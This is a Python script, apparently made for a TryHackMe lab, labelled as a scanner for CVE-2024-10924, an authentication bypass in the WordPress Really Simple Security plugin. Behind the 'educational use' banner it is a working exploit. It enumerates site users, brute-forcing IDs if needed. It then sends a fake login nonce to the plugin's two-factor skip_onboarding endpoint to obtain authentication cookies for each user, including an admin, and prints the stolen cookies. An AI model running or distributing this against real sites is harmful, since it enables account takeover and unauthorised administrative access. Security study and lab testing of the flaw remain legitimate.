#!/usr/bin/env python3
"""
CVE-2024-10924 Scanner
Really Simple Security Plugin - Authentication Bypass
Author: Educational purposes only | TryHackMe
"""

import sys
import json
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar

# ─────────────────────────────────────────────
#  ANSI Colors
# ─────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"
DIM    = "\033[2m"

BANNER = f"""
{CYAN}{BOLD}
  ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       
 ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║       
 ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║       
 ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║       
 ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗      ██║       
  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝      ╚═╝       
{RESET}
{DIM}  Really Simple Security Plugin — Authentication Bypass Scanner{RESET}
{DIM}  CVE-2024-10924 | CVSS 9.8 CRITICAL{RESET}
{YELLOW}  ⚠  For authorized testing and educational use only{RESET}
{"─"*65}
"""


def make_request(url, data=None, cookies=None, timeout=10):
    """Simple HTTP request using only stdlib."""
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (CVE-2024-10924-Scanner)"
    }
    if cookies:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method="POST" if body else "GET")

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            response_cookies = {}
            for header in resp.headers.get_all("Set-Cookie") or []:
                parts = header.split(";")[0].strip()
                if "=" in parts:
                    k, v = parts.split("=", 1)
                    response_cookies[k.strip()] = v.strip()
            return resp.status, resp.read().decode(errors="ignore"), response_cookies
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="ignore"), {}
    except Exception as e:
        return None, str(e), {}


def normalize_url(url):
    """Ensure URL has a scheme."""
    if not url.startswith("http"):
        url = "http://" + url
    return url.rstrip("/")


def check_wordpress(base_url):
    """Confirm target is WordPress."""
    print(f"  {DIM}[~] Checking if target is WordPress...{RESET}")
    status, body, _ = make_request(base_url)
    if status and ("wp-content" in body or "wp-login" in body or "WordPress" in body):
        print(f"  {GREEN}[✓] WordPress detected{RESET}")
        return True
    print(f"  {YELLOW}[?] WordPress not confirmed, continuing anyway...{RESET}")
    return False


def check_login_page(base_url):
    """Check if wp-login.php or wp-admin is accessible."""
    print(f"\n  {DIM}[~] Checking login endpoints...{RESET}")
    found = []
    for path in ["/wp-login.php", "/wp-admin/"]:
        status, _, _ = make_request(base_url + path)
        icon = f"{GREEN}[✓]" if status and status in [200, 302] else f"{RED}[✗]"
        print(f"  {icon} {base_url + path} → HTTP {status}{RESET}")
        if status and status in [200, 302]:
            found.append(path)
    return found


def get_rest_base(base_url):
    """Figure out the REST API base (pretty or query-string)."""
    print(f"\n  {DIM}[~] Detecting REST API endpoint...{RESET}")

    # Try pretty permalinks
    status, body, _ = make_request(base_url + "/wp-json/")
    if status == 200 and "namespaces" in body:
        print(f"  {GREEN}[✓] REST API found at /wp-json/{RESET}")
        return base_url + "/wp-json"

    # Try query-string fallback
    status, body, _ = make_request(base_url + "/?rest_route=/")
    if status == 200 and "namespaces" in body:
        print(f"  {GREEN}[✓] REST API found via ?rest_route={RESET}")
        return base_url + "/index.php?rest_route="

    print(f"  {RED}[✗] REST API not accessible{RESET}")
    return None


def enumerate_users(rest_base):
    """Get user list from WP REST API."""
    print(f"\n  {DIM}[~] Enumerating users via REST API...{RESET}")

    if "rest_route=" in rest_base:
        url = rest_base + "/wp/v2/users"
    else:
        url = rest_base + "/wp/v2/users"

    status, body, _ = make_request(url)
    users = []
    if status == 200:
        try:
            data = json.loads(body)
            for u in data:
                users.append({"id": u.get("id"), "name": u.get("name"), "slug": u.get("slug")})
                print(f"  {GREEN}[✓] User found → ID: {u.get('id')} | Name: {u.get('name')} | Slug: {u.get('slug')}{RESET}")
        except Exception:
            pass
    if not users:
        print(f"  {YELLOW}[?] User enumeration blocked, trying ID brute-force (1–5)...{RESET}")
        for uid in range(1, 6):
            s, b, _ = make_request(url + f"/{uid}")
            if s == 200:
                try:
                    u = json.loads(b)
                    users.append({"id": u.get("id"), "name": u.get("name"), "slug": u.get("slug")})
                    print(f"  {GREEN}[✓] User found → ID: {uid} | Name: {u.get('name')}{RESET}")
                except Exception:
                    pass
    return users


def check_plugin_namespace(rest_base):
    """Check if reallysimplessl namespace exists."""
    print(f"\n  {DIM}[~] Checking for Really Simple Security plugin...{RESET}")

    if "rest_route=" in rest_base:
        url = rest_base + "/"
    else:
        url = rest_base + "/"

    status, body, _ = make_request(url)
    if status == 200:
        try:
            data = json.loads(body)
            namespaces = data.get("namespaces", [])
            for ns in namespaces:
                if "reallysimple" in ns.lower():
                    print(f"  {GREEN}[✓] Really Simple Security namespace found: {ns}{RESET}")
                    return True
        except Exception:
            pass
    print(f"  {RED}[✗] Really Simple Security namespace not found{RESET}")
    return False


def attempt_bypass(rest_base, user_id, username):
    """Attempt the CVE-2024-10924 auth bypass for a given user."""
    print(f"\n  {DIM}[~] Attempting bypass for user '{username}' (ID: {user_id})...{RESET}")

    if "rest_route=" in rest_base:
        url = rest_base + "/reallysimplessl/v1/two_fa/skip_onboarding"
    else:
        url = rest_base + "/reallysimplessl/v1/two_fa/skip_onboarding"

    payload = {
        "user_id": user_id,
        "login_nonce": "1",  # Fake nonce — not validated due to bug
        "redirect_to": "/wp-admin/"
    }

    status, body, cookies = make_request(url, data=payload)

    if status == 200 and "redirect_to" in body:
        print(f"  {GREEN}{BOLD}[✓] BYPASS SUCCESSFUL for '{username}' (ID: {user_id})!{RESET}")
        if cookies:
            print(f"  {GREEN}[✓] Auth cookies received:{RESET}")
            for k, v in cookies.items():
                print(f"      {DIM}{k} = {v[:60]}...{RESET}")
        return True, cookies
    else:
        print(f"  {RED}[✗] Bypass failed for '{username}' (status: {status}){RESET}")
        return False, {}


def scan(target_url):
    print(BANNER)
    base_url = normalize_url(target_url)
    print(f"{BOLD}  Target:{RESET} {base_url}\n")
    print("─" * 65)

    results = {
        "target": base_url,
        "is_wordpress": False,
        "login_pages": [],
        "plugin_present": False,
        "users": [],
        "vulnerable": False,
        "bypassed_users": []
    }

    # Step 1: WordPress check
    results["is_wordpress"] = check_wordpress(base_url)

    # Step 2: Login pages
    results["login_pages"] = check_login_page(base_url)

    # Step 3: REST API
    rest_base = get_rest_base(base_url)
    if not rest_base:
        print(f"\n{RED}{BOLD}  [!] Cannot reach REST API. Target may not be vulnerable or is unreachable.{RESET}")
        return results

    # Step 4: Plugin namespace check
    results["plugin_present"] = check_plugin_namespace(rest_base)
    if not results["plugin_present"]:
        print(f"\n{YELLOW}  [!] Really Simple Security plugin not detected — likely NOT vulnerable.{RESET}")
        return results

    # Step 5: User enumeration
    results["users"] = enumerate_users(rest_base)
    if not results["users"]:
        # Try admin (ID=1) blindly
        results["users"] = [{"id": 1, "name": "admin", "slug": "admin"}]
        print(f"  {YELLOW}[?] No users enumerated, trying default admin (ID: 1){RESET}")

    # Step 6: Auth bypass attempts
    print(f"\n{'─'*65}")
    print(f"{BOLD}  [*] Attempting CVE-2024-10924 Authentication Bypass...{RESET}")
    print(f"{'─'*65}")

    for user in results["users"]:
        success, cookies = attempt_bypass(rest_base, user["id"], user["name"] or user["slug"])
        if success:
            results["vulnerable"] = True
            results["bypassed_users"].append({
                "id": user["id"],
                "name": user["name"],
                "cookies": cookies
            })

    # ─── Final Report ───
    print(f"\n{'═'*65}")
    print(f"{BOLD}  SCAN RESULTS — {base_url}{RESET}")
    print(f"{'═'*65}")
    print(f"  WordPress Detected : {'Yes' if results['is_wordpress'] else 'No'}")
    print(f"  Login Pages Found  : {', '.join(results['login_pages']) or 'None'}")
    print(f"  Plugin Present     : {'Yes' if results['plugin_present'] else 'No'}")
    print(f"  Users Found        : {len(results['users'])}")

    if results["vulnerable"]:
        print(f"\n  {RED}{BOLD}  ██████████████████████████████████████{RESET}")
        print(f"  {RED}{BOLD}  ██  VULNERABLE — CVE-2024-10924  ██{RESET}")
        print(f"  {RED}{BOLD}  ██████████████████████████████████████{RESET}\n")
        for u in results["bypassed_users"]:
            print(f"  {RED}[!] Auth bypass succeeded → User: {u['name']} | ID: {u['id']}{RESET}")
    else:
        print(f"\n  {GREEN}{BOLD}[✓] NOT VULNERABLE — No auth bypass achieved{RESET}")

    print(f"\n{'═'*65}\n")
    return results


# ─────────────────────────────────────────────
#  Entry Point
# ─────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"\nUsage:  python3 wp_cookie-bypass.py <target_url>")
        print(f"Example: python3 wp_cookie-bypass.py http://vulnerable.thm:8080\n")
        sys.exit(1)

    scan(sys.argv[1])
